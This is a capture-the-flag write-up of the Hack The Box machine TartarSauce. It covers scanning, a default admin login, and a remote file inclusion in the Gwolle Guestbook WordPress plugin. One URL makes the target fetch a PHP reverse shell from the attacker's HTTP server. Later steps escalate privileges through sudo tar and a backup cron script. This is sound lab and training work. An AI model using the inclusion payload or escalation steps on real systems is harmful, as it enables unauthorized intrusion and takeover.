# TartarSauce

This is my write-up for the machine **TartarSauce** on Hack The Box located at: [https://app.hackthebox.com/machines/TartarSauce](https://app.hackthebox.com/machines/TartarSauce).

Running an nmap scan (`nmap -T4 -A -v 10.10.10.88 -oN tartarsauce.full`) we get the following:

![](<../../.gitbook/assets/image (341).png>)

The main page doesn't really have anything helpful on it:

![](<../../.gitbook/assets/image (324).png>)

Going to one of the "disallowed entries" from the nmap scan we get to the following:

![](<../../.gitbook/assets/image (331).png>)

To me this is a sign that this web server is using **monstra** as its CMS. I then ran **dirsearch** with the following command to see what directories/files I can access:

`dirsearch -e php,html,js,cgi,bak,txt -u http://10.10.10.88 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50`

So I was about to make a **hydra** command to run on the page [http://10.10.10.88/webservices/monstra-3.0.4/admin/index.php?id=dashboard](http://10.10.10.88/webservices/monstra-3.0.4/admin/index.php?id=dashboard), but what ended up happening was that when I typed in **admin**/**admin** to see what the error code would be, I actually got in:

![](<../../.gitbook/assets/image (333) (1).png>)

After trying to upload a reverse PHP shell to the system unsuccessfully for a while, I decided to read up on [this write-up](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html#nmap), which made me realize I had over looked the sub-directories for the **/webservices** directory:

![](<../../.gitbook/assets/image (350).png>)

Based on the write-up previously, I also ended up running **wpscan** as well. The issue I ran into here was that the write-ups I was looking at online were showing that they had **Gwolle Guestbook** in their outputs for the **wpscan**. I was not getting that output. After some researching and tweaking, I was able to find the command that worked for me:

`wpscan --url http://10.10.10.88/webservices/wp --enumerate p,t,u -v --plugins-detection aggressive --api-token <API-TOKEN-HERE>`

This then resulted in this:

![](<../../.gitbook/assets/image (362) (1).png>)

At this point, I had no idea what to do, so I looked at the official Hack The Box write-up for this machine, and learned that in the **\<IP>/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt** file, there is the following:

![](<../../.gitbook/assets/image (348).png>)

It seems that the actual version is 1.5.3. Then found [this exploit-db page](https://www.exploit-db.com/exploits/38861) which has an exploit for this exact version:

![](<../../.gitbook/assets/image (356).png>)

I was trying the link, but kept on failing. Reading the official write-up, I realized that the URL I had made was incorrect. The correct one was the following:

`http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.14/`

What I had done prior to this was downloaded [pentestmonkey's php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) file from GitHub and renamed it to **wp-load.php** (based on the recommendation from the exploit-db entry previously mentioned). I did edit the php-reverse-shell to have my IP Address in it, that way I can get a connection back when executed. I also had a **python3 HTTP Server** running that way I can get the file from my own machine:

![](<../../.gitbook/assets/image (330).png>)

After I ran the aforementioned link, I got a shell:

![](<../../.gitbook/assets/image (339) (1).png>)

I then upgraded the shell using a command from [this website](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-1-python-pty-module):

![](<../../.gitbook/assets/image (360).png>)

In the **/home** directory, there is a user named **onuma**, but as the www-data, I do not have access to the user. I then downloaded the **linpeas.sh** file from GitHub, and then used a **python3 HTTP Server** to upload it to the remote target:

![](<../../.gitbook/assets/image (361) (1).png>)

![](<../../.gitbook/assets/image (337).png>)

I then ran linpeas.sh on the remote machine. I saw the following interesting things:

![](<../../.gitbook/assets/image (364) (1) (1).png>)

![](<../../.gitbook/assets/image (340).png>)

![](<../../.gitbook/assets/image (336).png>)

Searching on Google for "run sudo as another user" gave the following answer:

![](<../../.gitbook/assets/image (332).png>)

Combining this with the GTFOBins command for the **/bin/tar** command, I was able to make the following command and switch user to onuma:

![](<../../.gitbook/assets/image (359) (1).png>)

![](<../../.gitbook/assets/image (374) (1) (1).png>)

I then got the **user.txt flag**:

![](<../../.gitbook/assets/image (355) (1).png>)

I then ran linpeas again, this time as the onuma user. Here's what I had found interesting this time:

![](<../../.gitbook/assets/image (351) (1).png>)

![](<../../.gitbook/assets/image (349) (1).png>)

![](<../../.gitbook/assets/image (363) (1).png>)

![](<../../.gitbook/assets/image (354) (1).png>)

Reading [this write-up](https://github.com/nikip72/HTB/tree/main/TartarSauce), I learned about **pspy** and that I should upload it to the remote machine in order to see what is being run in the cronjobs:

![](<../../.gitbook/assets/image (357).png>)

![](<../../.gitbook/assets/image (335).png>)

I was not aware of this, but the aforementioned write-up pointed out that this was an unusual software to be run:

![](<../../.gitbook/assets/image (329).png>)

After reading the **/usr/sbin/backuperer** file using the **cat** command, I was still unsure about what to do. I copied the script from [this write-up](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html#nmap), and uploaded it to the machine using the **python3 HTTP Server** module. Running the code led me to the root flag:

![](<../../.gitbook/assets/image (358).png>)
